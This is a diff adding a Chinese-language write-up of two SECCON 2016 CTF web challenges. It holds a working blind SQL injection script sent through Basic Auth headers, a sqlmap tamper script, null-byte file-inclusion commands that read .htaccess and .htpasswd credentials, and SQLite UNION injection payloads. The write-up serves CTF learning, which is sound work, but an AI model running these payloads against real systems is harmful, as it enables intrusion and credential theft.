@@ -1,0 +1,190 @@
+##basiq
+key: 盲注，多字节编码
+题目让找到admin的密码
+在http://basiq.pwn.seccon.jp/admin/的basic-http认证存在sql注入，（一般情况下没有，所以可能是自己写的模块？）
+admin:admin' or '1'='1能够登陆进去
+然后就是盲注了，数据库是mysql
+爆出表名只有三位，（这个地方当时不会，然后用ascii函数发现是正常的ascii码，然后就完全错了）， 应该用ord函数代替ascii函数来求ascii码，因为ord函数对多字节字符是以((first byte ASCII code)*256+(second byte ASCII code))[*256+third byte ASCII code...]返回值，ascii函数只返回最左边字节. 用ord函数可以判断多字节字符
+发现是多字节编码后应该先用hex函数把多字节字符变成16进制字符串再来注入，在这里每一个多字节是6位16进制字符串，这里贴上代码求表名，http基础验证这里要base64编码一下，抓个包看一下就知道了
+for i in range(1,4):
+    for j in range(1,7):
+        up = 255
+        down = 0
+        while down < up:
+            mid = int((up+down)/2)
+            payload = "admin:adminss' or ascii(substr(hex(substr((select table_name from information_schema.tables where table_schema = 'keiba' limit 0,1)," + str(i) + ",1)),"+str(j)+",1))>" + str(mid) + "#"
+            HEADER = {'Authorization': 'Basic '+ base64.b64encode(payload.encode()).decode()}
+            r = requests.get(url=URL, headers = HEADER)
+            if r.status_code==200:
+                down = mid +1
+            else:
+                up = mid
+            print(mid)
+        answer += chr(down)+'|'
+print(answer)
+然后列名，没太大变化，就贴payload，注意这里的table_name我是用unhex函数把16进制字符串转会成字符串了，因为where table_name后面要加字符串，后面有求字段的时候from后面跟的是变量名而不是字符串,也就是 'name' 和 name的区别。
+payload = "admin:adminss' or ascii(substr((select column_name from information_schema.columns where table_name=unhex('E298B9E298BAE298BB') limit 2,1), "+str(i)+" ,1)) >"+str(mid)+"#"
+求出来 pass 列名
+求字段，不知道为啥python3这句话跑不起，然后用python2跑得起，我估计是因为base64.b64encode这个函数的原因，导致\xe2\x98\xb9\xe2\x98\xba\xe2\x98\xbb不能正确在mysql里面编码，在python3里只接受bytes，python2支持字符串，还是python2方便一些。。
+payload="admin:adminsss' or substr((select pass from \xe2\x98\xb9\xe2\x98\xba\xe2\x98\xbb limit 0,1)," + str(i) + ",1)='" + j + "'#"
+header = {'Authorization':'Basic ' + base64.b64encode(payload)}
+跑出来 seccon{carnival}
+
+另外的方法，直接抓包然后改成 
+Authorization: Basic *
+写一个tamper 
+def tamper(payload, **kwargs):
+    now = "admin:adminss" + payload
+    return  base64.b64encode(now.encode(UNICODE_ENCODING)) if now else now
+直接sqlmap -r seccon.txt --ignore-401 --tamper basiq.py --dbs --hex 也跑得出来
+sqlmap无法跑401和正常页面来表达正确与否的boolean-based注入，因为401页面会被ignored,sqlmap识别的页面只有一种页面，所以sqlmap只能用基于时间的盲注去搞，跑着很慢。。
+
+
+##uncomfortable web
+KEY: 信息收集, 数据库类型识别, curl命令可以简化操作，文件包含
+
+进入页面只有一个上传页面和三个sample script, 随便看了一下.sh和.py, 都是访问127.0.0.1:81
+sample1.sh：curl http://127.0.0.1:81/ 
+上传sample1.sh
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<html>
+ <head>
+  <title>Index of /</title>
+ </head>
+ <body>
+<h1>Index of /</h1>
+<table><tr><th><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr><tr><th colspan="5"><hr></th></tr>
+<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="authed/">authed/</a></td><td align="right">28-Nov-2016 10:51  </td><td align="right">  - </td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="select.cgi">select.cgi</a></td><td align="right">28-Nov-2016 10:08  </td><td align="right">612 </td><td>&nbsp;</td></tr>
+<tr><th colspan="5"><hr></th></tr>
+</table>
+<address>Apache Server at 127.0.0.1 Port 81</address>
+</body></html>
+得到响应是一段html，说明在服务器上有127.0.0.1:81开了http服务而且只能本地访问，其实也就是通过脚本去访问这个站。
+在response中有 select.cgi，和authed/比较让人在意
+上传sample1.sh
+curl http://127.0.0.1:81/select.cgi
+curl http://127.0.0.1:81/authed 
+<html>
+<body>
+<form action="?" method="get">
+<select name="txt">
+<option value="a">a</option>
+<option value="b">b</option>
+</select>
+<input type="submit" vaue="GO">
+</form>
+</body></html>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+115   460  115   460    0     0   401k      0 --:--:-- --:--:-- --:--:--  449k
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>401 Authorization Required</title>
+</head><body>
+<h1>Authorization Required</h1>
+<p>This server could not verify that you
+are authorized to access the document
+requested.  Either you supplied the wrong
+credentials (e.g., bad password), or your
+browser doesn't understand how to supply
+the credentials required.</p>
+<hr>
+<address>Apache Server at 127.0.0.1 Port 81</address>
+</body></html>
+select.cgi是一个option表单，txt参数，值是'a'和'b', 
+/authed/是401，说明需要http basic authorization
+先看
+curl http://127.0.0.1:81/select.cgi?txt=a
+curl http://127.0.0.1:81/select.cgi?txt=b
+<hr>
+authed/a.txt<br>
+authed/b.txt<br>
+估计这里是一个文件包含，尝试00截断
+curl http://127.0.0.1:81/select.cgi?txt=a.txt%00
+可以成功访问，尝试下读.htaccess
+curl http://127.0.0.1:81/select.cgi?txt=../.htaccess%00
+AuthUserFile /var/www/html-inner/authed/.htpasswd<br>
+AuthGroupFile /dev/null<br>
+AuthName &quot;SECCON 2016&quot;<br>
+AuthType Basic<br>
+Require user keigo<br>
+其中有http基础认证的内容，.htpasswd中保存了http基础认证的账号密码.
+curl http://127.0.0.1:81/select.cgi?txt=.htpasswd%00
+keigo:LdnoMJCeVy.SE
+查了一下，htpasswd默认采用MD5加密，直接cmd5跑出来密码是test
+（看了几篇write up 都是用john跑出来的。。可以去研究一下）
+curl -u 命令直接加上http基础认证
+curl -u keigo:test http://127.0.0.1:81/authed/
+得到
+<td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="sqlinj/">sqlinj/</a></td><td align="right">28-Nov-2016 11:41  </td><td align="right">  - </td><td>&nbsp;</td></tr>
+<tr><th colspan="5"><hr></th></tr>
+其中sqlinj/目录是提示有sql注入
+访问得到
+<body>
+<h1>Index of /authed/sqlinj</h1>
+<table><tr><th><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr><tr><th colspan="5"><hr></th></tr>
+<tr><td valign="top"><img src="/icons/back.gif" alt="[DIR]"></td><td><a href="/authed/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="1.cgi">1.cgi</a></td><td align="right">28-Nov-2016 11:41  </td><td align="right">750 </td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="2.cgi">2.cgi</a></td><td align="right">28-Nov-2016 11:41  </td><td align="right">750 </td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="3.cgi">3.cgi</a></td><td align="right">28-Nov-2016 11:41  </td><td align="right">750 </td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="4.cgi">4.cgi</a></td><td align="right">28-Nov-2016 11:41  </td><td align="right">750 </td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="5.cgi">5.cgi</a></td><td align="right">28-Nov-2016 11:41  </td><td align="right">750 </td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="6.cgi">6.cgi</a></td><td align="right">28-Nov-2016 11:41  </td><td align="right">750 </td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="7.cgi">7.cgi</a></td><td align="right">28-Nov-2016 11:41  </td><td align="right">750 </td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="8.cgi">8.cgi</a></td><td align="right">28-Nov-2016 11:41  </td><td align="right">750 </td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="9.cgi">9.cgi</a></td><td align="right">28-Nov-2016 11:41  </td><td align="right">750 </td><td>&nbsp;</td></tr>
+
+......总共100个cgi，随便查看其中一个
+</head>
+<body>
+<a href="?no=4822267938">link</a>
+</body></html>
+得到一个a标签的get请求，参数是no，访问1.cgi?no=4822267938
+<body>
+<a href="?no=4822267938">link</a>
+<hr>
+ISBN-10: 4822267938<br>
+ISBN-13: 978-4822267933<br>
+PUBLISH: 2016/2/19<p>
+</body></html>
+根据目录名的提示，说明这是一个带入数据库的操作，
+对所有的cgi都带入 'or'1 尝试注入
+curl -u keigo:test http://127.0.0.1:81/authed/sqlinj/[1-100].cgi?no=%27or%271
+(第一次见[1-100]这种用法，属于curl命令的技巧，还有{name1,name2}这个就是字符的迭代，-o保存文件也可以定义动态文件名 -o #2-#1.jpg url/{name1,name2}[1-100].jpg 会保存成[1-100]-{name1,name2}.jpg, 类似于占位符)
+发现只有72.cgi有response,这里是注入的入口
+</body></html>--_curl_--http://127.0.0.1:81/authed/sqlinj/72.cgi?no=%27or%271
+<html>
+<head>
+  <title>SECCON 2016 Online</title>
+  <!-- by KeigoYAMAZAKI, 2016.11.08- -->
+</head>
+<body>
+<a href="?no=4822267938">link</a>
+<hr>
+ISBN-10: 4822267865<br>
+ISBN-13: 978-4822267865<br>
+PUBLISH: 2015/2/20<p>
+ISBN-10: 4822267911<br>
+ISBN-13: 978-4822267919<br>
+PUBLISH: 2015/8/27<p>
+ISBN-10: 4822267938<br>
+ISBN-13: 978-4822267933<br>
+PUBLISH: 2016/2/19<p>
+ISBN-10: 4822237842<br>
+ISBN-13: 978-4822237844<br>
+PUBLISH: 2016/8/25<p>
+然后坑来了。。sqlite数据库我不知道。。所以按mysql的办法来永远都搞不出来。。
+sqlite_version()是sqlite的特征函数，判断出sqlite数据库之后，这个是有回显的，直接union select
+order by 得到查询的是3位，
+' and '1'='0' union select name,sql,3 from sqlite_master--
+ISBN-10: books&lt;br&gt;
+ISBN-13: CREATE TABLE books (isbn10,isbn13,date)&lt;br&gt;
+PUBLISH: 3&lt;p&gt;
+ISBN-10: f1ags&lt;br&gt;
+ISBN-13: CREATE TABLE f1ags (f1ag)&lt;br&gt;
+PUBLISH: 3&lt;p&gt;
+' and '1'='0' union select f1ag,2,3 from f1ags--  （注意这里是f1ag而不是flag。。。）
+得到flagSECCON{I want to eventually make a CGC web edition... someday...}
+
